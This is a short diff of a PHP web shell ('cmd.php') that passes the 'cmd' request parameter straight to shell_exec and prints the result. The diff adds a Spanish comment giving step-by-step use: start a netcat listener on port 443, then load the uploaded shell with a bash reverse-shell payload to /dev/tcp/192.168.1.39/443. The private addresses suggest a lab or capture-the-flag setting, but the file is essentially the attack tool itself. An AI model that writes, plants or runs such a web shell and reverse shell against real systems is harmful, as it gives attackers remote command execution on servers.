@@ -1,3 +1,4 @@
+<-- recuerda usar sudo nc -nlvp 443 y despues usar http://172.17.0.2/uploads/cmd.php?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.1.39/443 0>%261" en la url -->
 <?php
 	echo"<pre>".shell_exec($_REQUEST['cmd'])."</pre>";
 ?>
